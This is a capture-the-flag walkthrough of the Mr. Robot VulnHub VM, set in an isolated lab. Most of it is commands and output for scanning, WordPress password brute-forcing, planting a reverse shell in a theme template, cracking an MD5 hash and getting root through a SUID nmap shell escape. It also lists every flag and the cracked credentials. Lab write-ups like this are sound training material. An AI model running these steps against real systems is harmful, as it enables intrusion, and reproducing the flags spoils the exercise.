Mr. Robot-Inspired Hacking Exercise (CTF Write-Up)


Setup


Downloads:

Kali Linux for VirtualBox: https://www.kali.org/get-kali/#kali-virtual-machines


Mr. Robot VM from VulnHub: https://www.vulnhub.com/entry/mr-robot-1,151/


```markdown

## Initial Setup

- **Attacker Machine**: Kali Linux (running in VirtualBox)
- **Victim Machine**: Mr. Robot VM from VulnHub (imported and run in VirtualBox)
- **Networking**: Both VMs connected to a VirtualBox host-only network for isolated internal scanning.

VirtualBox Setup:
Add both Kali and Mr. Robot VMs to VirtualBox.
Create an internal network called "net" and assign both VMs to it.
Enable DHCP so Mr. Robot can get an IP:
bash
CopyEdit
VBoxManage dhcpserver add --network=net --server-ip=192.168.56.1 --lower-ip=192.168.56.100 --upper-ip=192.168.56.200 --netmask=255.255.255.0 --enable
Explanation:
--server-ip: Acts like the router IP.
--lower-ip / --upper-ip: IP range for devices on the network.
Boot up Kali:
User: kali
Password: kali

---

## 1. Discovering the Target

Used `netdiscover` to find the IP address of the target VM:

```bash
netdiscover -r 192.168.56.0/24
```

Found the target at:

```
192.168.56.101
```

---

## 2. Scanning with Nmap

Performed a full port scan:

```bash
nmap -sS -p- 192.168.56.101
```

### Result:
- **Port 80**: HTTP
- **Port 443**: HTTPS

Performed a more detailed scan of open ports:

```bash
nmap -sV -sC -p 80,443 192.168.56.101
```

---

## 3. Web Enumeration

Navigated to the web server in a browser:

```
http://192.168.56.101
```

Found a *Mr. Robot*-themed website with a wordlist link. Downloaded it:

```bash
wget http://192.168.56.101/fsocity.dic
```

---

## 4. Finding Hidden Directories

Used `gobuster` to discover hidden directories:

```bash
gobuster dir -u http://192.168.56.101 -w fsocity.dic
```

Discovered:
- `/admin/`
- `/robots.txt`

---

## 5. Getting Key 1

Visited:

```
http://192.168.56.101/robots.txt
```

### Output:
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Visited `key-1-of-3.txt` directly:

```bash
http://192.168.56.101/key-1-of-3.txt
```

### Found Key 1:
```
073403c8a58alf80d943455fb30724b9
```

---

## 6. Brute-Forcing WordPress Login

Identified that the site is running WordPress. Tried default `/wp-login.php`.

Used `wpscan` to enumerate users and brute-force login using `fsocity.dic` as a wordlist.

```bash
wpscan --url http://192.168.56.101 --enumerate u
```

Discovered a valid user:
```
elliot
```

Then tried brute-forcing:

```bash
wpscan --url http://192.168.56.101 --passwords fsocity.dic --usernames elliot
```

Eventually got valid credentials:
```
Username: elliot
Password: ER28-0652
```

---

## 7. Uploading a Shell via WordPress

Logged into WordPress admin panel and edited the **404.php** template file to include a PHP reverse shell payload.

Started a listener on my Kali machine:

```bash
nc -lvnp 4444
```

Then triggered the shell by visiting:

```
http://192.168.56.101/wp-content/themes/twentyfifteen/404.php
```

Got a reverse shell!

---

## 8. Upgrading the Shell

Used Python to upgrade the shell to a more stable TTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then backgrounded the shell with `CTRL+Z`, used `stty` to fix terminal handling:

```bash
stty raw -echo
fg
```

Then ran:

```bash
export TERM=xterm
```

---

## 9. Finding Key 2

Explored the system and found another user named `robot`.

Switched to the `robot` user directory:

```bash
cd /home/robot
ls -la
```

Found `key-2-of-3.txt`, but it wasn’t accessible. However, there was a `password.raw-md5` file.

```bash
cat password.raw-md5
```

Found a hash:
```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Cracked the hash using `john`:

```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Got the password:
```
abcdefghijklmnopqrstuvwxyz
```

Switched user:

```bash
su robot
```

Entered the cracked password, then accessed Key 2:

```bash
cat key-2-of-3.txt
```

### Found Key 2:
```
822c73956184f694993bede3eb39f959
```

---

## Keys 1 & 2 Found!

```
1. 073403c8a58alf80d943455fb30724b9  
2. 822c73956184f694993bede3eb39f959
```

Next step: escalate privileges to root and find Key 3!
```

```markdown
# Mr. Robot CTF Write-Up: Key 3 – Privilege Escalation via Vulnerable Nmap

After exploring Robot's directory and not finding any clues for the third key, I moved on to privilege escalation in order to get root access.

Following a well-known Linux privilege escalation checklist ([g0tmi1k's guide](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)), I decided to check for SUID binaries—files that run with the permissions of their owner (often root) rather than the user executing them.

## 1. Finding SUID Binaries

```bash
find / -user root -perm -4000 2>/dev/null
```

### Explanation:
- `find /`: Searches from the root directory.
- `-user root`: Limits results to files owned by the root user.
- `-perm -4000`: Looks for files with the SUID bit set.
- `2>/dev/null`: Hides permission-denied errors.

### Output (relevant section):
```
/usr/local/bin/nmap
```

Among the standard SUID binaries, `/usr/local/bin/nmap` stood out — an older version of Nmap (3.81) known to be vulnerable when set with the SUID bit.

---

## 2. Investigating the Nmap Binary

```bash
/usr/local/bin/nmap --version
```

### Output:
```
nmap version 3.81 ( http://www.insecure.org/nmap/ )
```

This confirmed that the system was running an old version of Nmap, which allows privilege escalation via its interactive mode.

---

## 3. Exploiting Nmap for Root Access

```bash
nmap --interactive
```

### Output:
```
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> 
```

While in interactive mode, I used the `!` operator to execute shell commands:

```bash
nmap> !whoami
```

### Output:
```
root
waiting to reap child : No child processes
```

Boom! The command runs as root.

---

## 4. Spawning a Root Shell

To get a full root shell:

```bash
nmap> !bash -p
```

### Output:
```
bash-4.3#
```

`-p` ensures the shell retains root privileges and avoids resetting certain environment variables.

---

## 5. Retrieving the Final Key

Navigated to the root home directory and listed the files:

```bash
cd /root
ls -al
```

### Output:
```
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
```

Read the contents of the final key file:

```bash
cat key-3-of-3.txt
```

### Output:
```
04787ddef27c3dee1ee161b21670b4e4
```

---

## CTF Complete – All Keys Found!

```
1. 073403c8a58alf80d943455fb30724b9  
2. 822c73956184f694993bede3eb39f959  
3. 04787ddef27c3dee1ee161b21670b4e4
```

---

## Notes

- This privilege escalation only worked because `nmap` was an outdated and misconfigured SUID binary.
- Always check for known vulnerable binaries when doing post-exploitation privilege escalation.
```

---
